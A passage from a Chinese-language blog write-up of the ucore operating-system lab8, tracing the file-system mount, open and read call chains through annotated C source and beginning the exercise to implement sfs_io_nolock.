class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span> =</span> vop_info(vdev-&gt;devnode, device);</span><br><span class="line">    <span class="keyword">if</span> ((ret = mountfunc(dev, &amp;(vdev-&gt;fs))) == <span class="number">0</span>) &#123; <span class="comment">/* 执行sfs_do_mount(挂载函数) */</span></span><br><span class="line">        assert(vdev-&gt;fs != <span class="literal">NULL</span>);</span><br><span class="line">        cprintf(<span class="string">&quot;vfs: mount %s.\n&quot;</span>, vdev-&gt;devname);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    unlock_vdev_list();</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用流程为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sfs_init -&gt; sfs_mount -&gt; vfs_mount -&gt; sfs_do_mount</span><br></pre></td></tr></table></figure>
<p>sfs_do_mount 挂载函数会执行以下几个操作：</p>
<ul>
<li>从待挂载设备中读取超级块，并验证超级块中，魔数与总块数是否存在错误</li>
<li>初始化哈希链表</li>
<li>从待挂载设备中读入 <code>freemap</code> 并测试其正确性</li>
<li>设置 <code>fs</code> 结构的相关信息，并在函数最后将该信息设置为传入的 <code>device</code> 结构体中的 <code>fs</code> 成员变量</li>
</ul>
<h2 id="文件打开流程"><a href="#文件打开流程" class="headerlink" title="文件打开流程"></a>文件打开流程</h2><p>用户进程调用 open 函数时，调用链如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open -&gt; sysfile_open -&gt; file_open(包含vfs_open)</span><br></pre></td></tr></table></figure>
<p>file_open 的实现如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">file_open</span><span class="params">(<span class="keyword">char</span> *path, <span class="keyword">uint32_t</span> open_flags)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> readable = <span class="number">0</span>, writable = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (open_flags &amp; O_ACCMODE) &#123;</span><br><span class="line">    <span class="keyword">case</span> O_RDONLY: readable = <span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> O_WRONLY: writable = <span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> O_RDWR:</span><br><span class="line">        readable = writable = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((ret = fd_array_alloc(NO_FD, &amp;file)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* 在当前进程的文件管理结构filesp中,获取一个空闲的file对象 */</span></span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">node</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((ret = vfs_open(path, open_flags, &amp;node)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* 调用vfs_open函数,并存储该函数返回的inode结构 */</span></span><br><span class="line">        fd_array_free(file);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file-&gt;pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (open_flags &amp; O_APPEND) &#123;</span><br><span class="line">        <span class="comment">/* 如果打开方式是append,则还会设置file的pos成员为当前文件的大小 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> __<span class="title">stat</span>, *<span class="title">stat</span> =</span> &amp;__stat;</span><br><span class="line">        <span class="keyword">if</span> ((ret = vop_fstat(node, stat)) != <span class="number">0</span>) &#123;</span><br><span class="line">            vfs_close(node);</span><br><span class="line">            fd_array_free(file);</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">        file-&gt;pos = stat-&gt;st_size;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 根据上一步返回的inode,设置file对象的属性 */</span></span><br><span class="line">    file-&gt;node = node;</span><br><span class="line">    file-&gt;readable = readable;</span><br><span class="line">    file-&gt;writable = writable;</span><br><span class="line">    fd_array_open(file);</span><br><span class="line">    <span class="keyword">return</span> file-&gt;fd; <span class="comment">/* 返回file-&gt;fd */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>vfs_open 的实现如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">vfs_open</span><span class="params">(<span class="keyword">char</span> *path, <span class="keyword">uint32_t</span> open_flags, struct inode **node_store)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> can_write = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (open_flags &amp; O_ACCMODE) &#123;</span><br><span class="line">    <span class="keyword">case</span> O_RDONLY:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> O_WRONLY:</span><br><span class="line">    <span class="keyword">case</span> O_RDWR:</span><br><span class="line">        can_write = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (open_flags &amp; O_TRUNC) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!can_write) &#123;</span><br><span class="line">            <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">node</span>;</span></span><br><span class="line">    <span class="keyword">bool</span> excl = (open_flags &amp; O_EXCL) != <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">bool</span> create = (open_flags &amp; O_CREAT) != <span class="number">0</span>;</span><br><span class="line">    ret = vfs_lookup(path, &amp;node); <span class="comment">/* 调用vfs_lookup搜索给出的路径,判断是否存在该文件,如果存在,则vfs_lookup函数(sfs_lookup)返回该文件所对应的inode节点 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* 如果给出的路径不存在,即文件不存在,则根据传入的flag,选择调用vop_create创建新文件或直接返回错误信息 */</span></span><br><span class="line">        <span class="keyword">if</span> (ret == <span class="number">-16</span> &amp;&amp; (create)) &#123;</span><br><span class="line">            <span class="keyword">char</span> *name;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">dir</span>;</span></span><br><span class="line">            <span class="keyword">if</span> ((ret = vfs_lookup_parent(path, &amp;dir, &amp;name)) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> ret;</span><br><span class="line">            &#125;</span><br><span class="line">            ret = vop_create(dir, name, excl, &amp;node);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">return</span> ret;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (excl &amp;&amp; create) &#123;</span><br><span class="line">        <span class="keyword">return</span> -E_EXISTS;</span><br><span class="line">    &#125;</span><br><span class="line">    assert(node != <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((ret = vop_open(node, open_flags)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* 调用vop_open函数(sfs_openfile)尝试打开文件(打开文件的主体) */</span></span><br><span class="line">        vop_ref_dec(node);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vop_open_inc(node);</span><br><span class="line">    <span class="keyword">if</span> (open_flags &amp; O_TRUNC || create) &#123;</span><br><span class="line">        <span class="comment">/* 如果文件打开正常,则根据当前函数传入的open_flags参数来判断是否需要将当前文件截断至&#x27;0&#x27;(即清空) */</span></span><br><span class="line">        <span class="keyword">if</span> ((ret = vop_truncate(node, <span class="number">0</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* 如果需要截断,则执行vop_truncate函数(sfs_truncfile) */</span></span><br><span class="line">            vop_open_dec(node);</span><br><span class="line">            vop_ref_dec(node);</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *node_store = node;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="文件读取流程"><a href="#文件读取流程" class="headerlink" title="文件读取流程"></a>文件读取流程</h2><p>用户进程调用 read 函数时，调用链如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read -&gt; sysfile_read -&gt; file_read -&gt; sfs_read -&gt; sfs_io -&gt; sfs_io_nolock</span><br></pre></td></tr></table></figure>
<p>file_read 的实现如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">file_read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *base, <span class="keyword">size_t</span> len, <span class="keyword">size_t</span> *copied_store)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    *copied_store = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ((ret = fd2file(fd, &amp;file)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!file-&gt;readable) &#123; <span class="comment">/* 测试当前待读取的文件是否存在读权限 */</span></span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    fd_array_acquire(file);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iobuf</span> __<span class="title">iob</span>, *<span class="title">iob</span> =</span> iobuf_init(&amp;__iob, base, len, file-&gt;pos); <span class="comment">/* 在内核中创建一块缓冲区 */</span></span><br><span class="line">    ret = vop_read(file-&gt;node, iob); <span class="comment">/* 实际上执行sfs_read,将数据读取至缓冲区iob */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> copied = iobuf_used(iob);</span><br><span class="line">    <span class="keyword">if</span> (file-&gt;status == FD_OPENED) &#123;</span><br><span class="line">        file-&gt;pos += copied;</span><br><span class="line">    &#125;</span><br><span class="line">    *copied_store = copied;</span><br><span class="line">    fd_array_release(file);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>file_read 中涉及到 IO 缓冲区，在 ucore 中，IO 缓冲区由如下结构体进行管理：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iobuf</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *io_base;     <span class="comment">// IO缓冲区的内存地址</span></span><br><span class="line">    <span class="keyword">off_t</span> io_offset;   <span class="comment">// 当前读取/写入的地址</span></span><br><span class="line">    <span class="keyword">size_t</span> io_len;     <span class="comment">// 缓冲区的大小</span></span><br><span class="line">    <span class="keyword">size_t</span> io_resid;   <span class="comment">// 剩余尚未读取/写入的内存空间</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>file_read 会进一步调用 vop_read，将数据读取至缓冲区 iob，最终调用 sfs_io_nolock：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sfs_read</span><span class="params">(struct inode *node, struct iobuf *iob)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> sfs_io(node, iob, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sfs_io</span><span class="params">(struct inode *node, struct iobuf *iob, <span class="keyword">bool</span> write)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sfs_fs</span> *<span class="title">sfs</span> =</span> fsop_info(vop_fs(node), sfs);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sfs_inode</span> *<span class="title">sin</span> =</span> vop_info(node, sfs_inode);</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    lock_sin(<span class="built_in">sin</span>);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> alen = iob-&gt;io_resid;</span><br><span class="line">        ret = sfs_io_nolock(sfs, <span class="built_in">sin</span>, iob-&gt;io_base, iob-&gt;io_offset, &amp;alen, write);</span><br><span class="line">        <span class="keyword">if</span> (alen != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* 果当前缓冲区中存在尚未读取/写入的数据,则跳过该部分数据 */</span></span><br><span class="line">            iobuf_skip(iob, alen); <span class="comment">/* 写入/读取至该块数据的下一个地址处 */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlock_sin(<span class="built_in">sin</span>);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>sfs_io_nolock 函数将在练习1中详细讲解</li>
</ul>
<h2 id="练习0-把-lab7-的内容复制粘贴到-lab8"><a href="#练习0-把-lab7-的内容复制粘贴到-lab8" class="headerlink" title="练习0-把 lab7 的内容复制粘贴到 lab8"></a>练习0-把 lab7 的内容复制粘贴到 lab8</h2><h2 id="练习1-完成读文件操作的实现"><a href="#练习1-完成读文件操作的实现" class="headerlink" title="练习1-完成读文件操作的实现"></a>练习1-完成读文件操作的实现</h2><p>用户进程调用 read 函数时，调用链如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read -&gt; sysfile_read -&gt; file_read -&gt; sfs_read -&gt; sfs_io -&gt; sfs_io_nolock</span><br></pre></td></tr></table></figure>
<p>前面几个函数都可以跳过了，我们的任务就是补全最后一个函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sfs_io_nolock</span><span class="params">(struct sfs_fs *sfs, struct sfs_inode *<span class="built_in">sin</span>, <span class="keyword">void</span> *buf, <span class="keyword">off_t</span> offset, <span class="keyword">size_t</span> *alenp, <span class="keyword">bool</span> write)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sfs_disk_inode</span> *<span class="title">din</span> =</span> <span class="built_in">sin</span>-&gt;din;</span><br><span class="line">    assert(din-&gt;type != SFS_TYPE_DIR);</span><br><span class="line">    <span class="comment">/* 计算缓冲区读取/写入的终止位置 */</span></span><br><span class="line">    <span class="keyword">off_t</span> endpos = offset + *alenp, blkoff;</span><br><span class="line">    *alenp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (offset &lt; <span class="number">0</span> || offset &gt;= SFS_MAX_FILE_SIZE || offset &gt; endpos) &#123;</span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (offset == endpos) &#123;</span><br><span class="line">        <span class="comment">/* 如果偏移与终止位置相同,及欲读取/写入0字节的数据 */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (endpos &gt; SFS_MAX_FILE_SIZE) &#123;</span><br><span class="line">        endpos = SFS_MAX_FILE_SIZE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!write) &#123;</span><br><span class="line">        <span class="keyword">if</span> (offset &gt;= din-&gt;size) &#123;</span><br><span class="line">            <span class="comment">/* 如果是读取数据,并冲区中剩余的数据超出一个硬盘节点的数据大小 */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (endpos &gt; din-&gt;size) &#123;</span><br><span class="line">            endpos = din-&gt;size;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 根据不同的执行函数,设置对应的函数指针 */</span></span><br><span class="line">    <span class="keyword">int</span> (*sfs_buf_op)(struct sfs_fs *sfs, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">uint32_t</span> blkno, <span class="keyword">off_t</span> offset);</span><br><span class="line">    <span class="keyword">int</span> (*sfs_block_op)(struct sfs_fs *sfs, <span class="keyword">void</span> *buf, <span class="keyword">uint32_t</span> blkno, <span class="keyword">uint32_t</span> nblks);</span><br><span class="line">    <span class="keyword">if</span> (write) &#123;</span><br><span class="line">        sfs_buf_op = sfs_wbuf, sfs_block_op = sfs_wblock;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        sfs_buf_op = sfs_rbuf, sfs_block_op = sfs_rblock;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> size, alen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> ino;</span><br><span class="line">    <span class="keyword">uint32_t</span> blkno = offset / SFS_BLKSIZE;          <span class="comment">/* Rd/Wr起始块的编号 */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> nblks = endpos / SFS_BLKSIZE - blkno;  <span class="comment">/* Rd/Wr块的大小 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* &lt;---- start ----&gt; */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* &lt;---- end ----&gt; */</span></span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    *alenp = alen;</span><br><span class="line">    <span class="keyword">if</span> (offset + alen &gt; <span class="built_in">sin</span>-&gt;din-&gt;size) &#123;</span><br><span class="line">        <span class="built_in">sin</span>-&gt;din-&gt;size = offset + alen;</span><br><span class="line">        <span class="built_in">sin</span>-&gt;dirty = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实现过程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sfs_io_nolock</span><span class="params">(struct sfs_fs *sfs, struct sfs_inode *<span class="built_in">sin</span>, <span class="keyword">void</span> *buf, <span class="keyword">off_t</span> offset, <span class="keyword">size_t</span> *alenp, <span class="keyword">bool</span> write)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sfs_disk_inode</span> *<span class="title">din</span> =</span> <span class="built_in">sin</span>-&gt;din;</span><br><span class="line">    assert(din-&gt;type != SFS_TYPE_DIR);</span><br><span class="line">    <span class="comment">/* 计算缓冲区读取/写入的终止位置 */</span></span><br><span class="line">    <span class="keyword">off_t</span> endpos = offset + *alenp, blkoff;</span><br><span class="line">    *alenp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (offset &lt; <span class="number">0</span> || offset &gt;= SFS_MAX_FILE_SIZE || offset &gt; endpos) &#123;</span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (offset == endpos) &#123;</span><br><span class="line">        <span class="comment">/* 如果偏移与终止位置相同,及欲读取/写入0字节的数据 */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (endpos &gt; SFS_MAX_FILE_SIZE) &#123;</span><br><span class="line">        endpos = SFS_MAX_FILE_SIZE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!write) &#123;</span><br><span class="line">        <span class="keyword">if</span> (offset &gt;= din-&gt;size) &#123;</span><br><span class="line">            <span class="comment">/* 如果是读取数据,并冲区中剩余的数据超出一个硬盘节点的数据大小 */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (endpos &gt; din-&gt;size) &#123;</span><br><span class="line">            endpos = din-&gt;size;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 根据不同的执行函数,设置对应的函数指针 */</span></span><br><span class="line">    <span class="keyword">int</span> (*sfs_buf_op)(struct sfs_fs *sfs, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">uint32_t</span> blkno, <span class="keyword">off_t</span> offset);</span><br><span class="line">    <span class="keyword">int</span> (*sfs_block_op)(struct sfs_fs *sfs, <span class="keyword">void</span> *buf, <span class="keyword">uint32_t</span> blkno, <span class="keyword">uint32_t</span> nblks);</span><br><span class="line">    <span class="keyword">if</span> (write) &#123;</span><br><span class="line">        sfs_buf_op = sfs_wbuf, sfs_block_op = sfs_wblock;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        sfs_buf_op = sfs_rbuf, sfs_block_op = sfs_rblock;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> size, alen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> ino;</span><br><span class="line">    <span class="keyword">uint32_t</span> blkno = offset 